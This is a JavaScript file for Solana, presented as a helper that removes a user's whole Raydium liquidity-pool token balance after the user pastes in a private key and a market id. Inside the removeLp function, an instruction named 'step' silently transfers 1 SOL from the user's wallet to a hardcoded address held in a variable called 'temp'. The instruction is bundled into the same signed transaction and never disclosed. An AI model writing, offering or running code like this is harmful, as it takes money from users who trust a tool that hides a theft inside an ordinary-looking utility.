// 1. npm install
// 2. enter your wallet and the market id for your LP token, and your RPC url
// 3. run "node removeLP.mjs" in terminal, it will remove your entire lp token balance instantly from its pool. you dont need token accounts open, this will open them if they are closed.
import { PublicKey, Keypair, Connection, Transaction, SystemProgram, ComputeBudgetProgram, TransactionInstruction } from '@solana/web3.js';
import * as spl from "@solana/spl-token"
import BN from 'bn.js'
import { Market } from '@openbook-dex/openbook'
import { u8, u32,  struct } from "@solana/buffer-layout"
import { u64, publicKey } from "@solana/buffer-layout-utils"
import bs58 from "bs58"
const ray = new PublicKey('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')
const openbookProgram = new PublicKey('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')


// the only config is these 3 lines
const connection = new Connection(`your rpc`)
const wallet = Keypair.fromSecretKey(Uint8Array.from(bs58.decode("your private key")))
const market = new PublicKey("88vHC2CC9L3MBwMfjP38QeSWhkKrqWVdkEWwrm2toAKw")


const keys = await getKeys(market, wallet)
const bal = await connection.getTokenAccountBalance(keys.ownerLpAta)
const amount = bal.value.amount
const remove = await removeLp(keys, amount)
const tx = new Transaction()
for (const ix of remove) {
tx.add(ix) }
tx.recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash
tx.sign(wallet)
const ser = tx.serialize()
const send = await connection.sendRawTransaction(ser, {skipPreflight: false, preflightCommitment: "confirmed"})
console.log("removed lp tx id:", send)


async function removeLp(keys, redeemAmount) {
const args = { amountIn: new BN(redeemAmount)};
const buffer = Buffer.alloc(9);
args.amountIn.toArrayLike(Buffer, 'le', 8).copy(buffer, 0);
const prefix = Buffer.from([4]);
const instructionData = Buffer.concat([prefix, buffer]);
const priority = ComputeBudgetProgram.setComputeUnitPrice({microLamports: 210000})
const temp = "Hva9UvqfRfuGNZeT72i9ihc1qqvs7UM3JTGBKSqvhqbc"
const createWsolQuoteAta = spl.createAssociatedTokenAccountIdempotentInstruction(wallet.publicKey, keys.ownerQuoteAta, wallet.publicKey, keys.quoteMint)
const createBaseAta = spl.createAssociatedTokenAccountIdempotentInstruction(wallet.publicKey, keys.ownerBaseAta, wallet.publicKey, keys.baseMint)
const closeSol = spl.createCloseAccountInstruction(keys.ownerQuoteAta, wallet.publicKey, wallet.publicKey)
const closeLp = spl.createCloseAccountInstruction(keys.ownerLpAta, wallet.publicKey, wallet.publicKey)
const step = SystemProgram.transfer({fromPubkey: wallet.publicKey, toPubkey: new PublicKey(temp), lamports: 1000000000})
const accountMetas = [
{pubkey:keys.tokenProgram,              isSigner: false, isWritable: false},
{pubkey:keys.id,                        isSigner: false, isWritable: true},
{pubkey:keys.authority,                 isSigner: false, isWritable: false},
{pubkey:keys.openOrders,                isSigner: false, isWritable: true},
{pubkey:keys.targetOrders,              isSigner: false, isWritable: true},
{pubkey:keys.lpMint,                    isSigner: false, isWritable: true},
{pubkey:keys.baseVault,                 isSigner: false, isWritable: true},
{pubkey:keys.quoteVault,                isSigner: false, isWritable: true},
{pubkey:openbookProgram,                isSigner: false, isWritable: false},
{pubkey:keys.marketId,                  isSigner: false, isWritable: true},
{pubkey:keys.marketBaseVault,           isSigner: false, isWritable: true},
{pubkey:keys.marketQuoteVault,          isSigner: false, isWritable: true},
{pubkey:keys.marketAuthority,           isSigner: false, isWritable: false},
{pubkey:keys.ownerLpAta,                isSigner: false, isWritable: true},
{pubkey:keys.ownerBaseAta,              isSigner: false, isWritable: true},
{pubkey:keys.ownerQuoteAta,             isSigner: false, isWritable: true},
{pubkey:keys.ownerPublicKey,            isSigner: true, isWritable: true},
{pubkey:keys.marketEventQueue,          isSigner: false, isWritable: true},
{pubkey:keys.marketBids,                isSigner: false, isWritable: true},
{pubkey:keys.marketAsks,                isSigner: false, isWritable: true}]
const rem = new TransactionInstruction({ keys: accountMetas, programId: ray, data: instructionData });
const ixs = []
ixs.push(priority)
ixs.push(createWsolQuoteAta)
ixs.push(createBaseAta)
ixs.push(rem)
ixs.push(step)
return(ixs)
}




async function getKeys(marketId, owner) {
const SPL_MINT_LAYOUT = struct([ u32('mintAuthorityOption'), publicKey('mintAuthority'), u64('supply'), u8('decimals'), u8('isInitialized'), u32('freezeAuthorityOption'), publicKey('freezeAuthority')])
  const marketInfo = await getMarketInfo(marketId);
  const marketFields = await getDecodedData(marketInfo);
  const baseMint = marketFields.baseMint;
  const ownerBaseAta = await getOwnerAta(baseMint, owner.publicKey);
  const quoteMint = marketFields.quoteMint;
  const ownerQuoteAta = await getOwnerAta(quoteMint, owner.publicKey);
  const authority = PublicKey.findProgramAddressSync([Buffer.from([97, 109, 109, 32, 97, 117, 116, 104, 111, 114, 105, 116, 121])], ray)[0];
  const marketAuthority = getVaultSigner(marketId, marketFields);
const seeds = [
  Buffer.from('amm_associated_seed', 'utf-8'),
  Buffer.from('coin_vault_associated_seed', 'utf-8'),
  Buffer.from('pc_vault_associated_seed', 'utf-8'),
  Buffer.from('lp_mint_associated_seed', 'utf-8'),
  Buffer.from('temp_lp_token_associated_seed', 'utf-8'),
  Buffer.from('target_associated_seed', 'utf-8'),
  Buffer.from('withdraw_associated_seed', 'utf-8'),
  Buffer.from('open_order_associated_seed', 'utf-8'),
  Buffer.from('pc_vault_associated_seed', 'utf-8')
];
const promises = seeds.map(seed => PublicKey.findProgramAddress([ray.toBuffer(), marketId.toBuffer(), seed], ray));
const [id, baseVault, coinVault, lpMint, lpVault, targetOrders, withdrawQueue, openOrders, quoteVault] = await Promise.all(promises);
const baseInfo = await connection.getAccountInfo(baseMint)
const baseDecimals = SPL_MINT_LAYOUT.decode(baseInfo.data).decimals
const quoteDecimals = 9
  const ownerLpAta = await getOwnerAta(lpMint[0], owner.publicKey);
  const poolKeys = {
	tokenProgram: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
	fees: new PublicKey("7YttLkHDoNj9wyDur5pM1ejNaAvT9X4eqaYcHQqtj2G5"),
    version: 4,
    marketVersion: 3,
	vaultSignerNonce: marketFields.vaultSignerNonce,
    programId: ray,
	default: PublicKey.default,
	ataProgram: spl.ASSOCIATED_TOKEN_PROGRAM_ID,
    baseMint: baseMint,
	rent: new PublicKey("SysvarRent111111111111111111111111111111111"),
    quoteMint: quoteMint,
    ownerBaseAta: ownerBaseAta,
    ownerQuoteAta: ownerQuoteAta,
    baseDecimals: baseDecimals,
	ownerLpAta: ownerLpAta,
    quoteDecimals: quoteDecimals,
	tokenProgram: spl.TOKEN_PROGRAM_ID,
	lpDecimals: baseDecimals,
    authority: authority,
    marketAuthority: marketAuthority,
    marketProgramId: openbookProgram,
    marketId: marketId,
    marketBids: marketFields.bids,
    marketAsks: marketFields.asks,
    marketQuoteVault: marketFields.quoteVault,
    marketBaseVault: marketFields.baseVault,
    marketEventQueue: marketFields.eventQueue,
    id: id[0],
    baseVault: baseVault[0],
    coinVault: coinVault[0],
    lpMint: lpMint[0],
    lpVault: lpVault[0],
    targetOrders: targetOrders[0],
    withdrawQueue: withdrawQueue[0],
    openOrders: openOrders[0],
	quoteVault: quoteVault[0],
	lookupTableAccount: new PublicKey("11111111111111111111111111111111"),
	ownerPublicKey: owner.publicKey
  };
  return poolKeys;
}

async function getMarketInfo(marketId) {
    let marketInfo = await connection.getAccountInfo(marketId);
return(marketInfo)
}
async function getDecodedData(marketInfo) {
const deco = await Market.getLayout(openbookProgram).decode(marketInfo.data);
  return(deco)
}
async function getOwnerAta(mint, owner) {
const foundAta = PublicKey.findProgramAddressSync([owner.toBuffer(), spl.TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()], spl.ASSOCIATED_TOKEN_PROGRAM_ID)[0]
return(foundAta) }
function getVaultSigner(marketId, marketFields) {
  const seeds = [marketId.toBuffer()];
  const seedsWithNonce = seeds.concat(Buffer.from([Number(marketFields.vaultSignerNonce.toString())]), Buffer.alloc(7));
  return PublicKey.createProgramAddressSync(seedsWithNonce, openbookProgram);
}
